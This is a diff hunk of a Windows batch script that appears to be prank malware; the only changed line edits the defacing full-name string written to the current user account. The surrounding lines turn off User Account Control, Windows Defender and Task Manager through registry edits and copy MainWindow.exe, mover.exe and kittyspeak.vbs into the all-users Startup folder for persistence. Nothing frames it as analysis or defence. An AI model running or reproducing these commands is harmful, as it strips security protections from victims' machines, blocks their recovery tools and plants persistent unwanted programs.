@@ -14,7 +14,7 @@ reg.exe ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDeskto
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
-net user %username% /fullname:"SPONGEBOB WAS HERE!!!"
+net user %username% /fullname:"FRANK SYD 20!!!"
 copy /y MainWindow.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 copy /y mover.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 copy /y kittyspeak.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
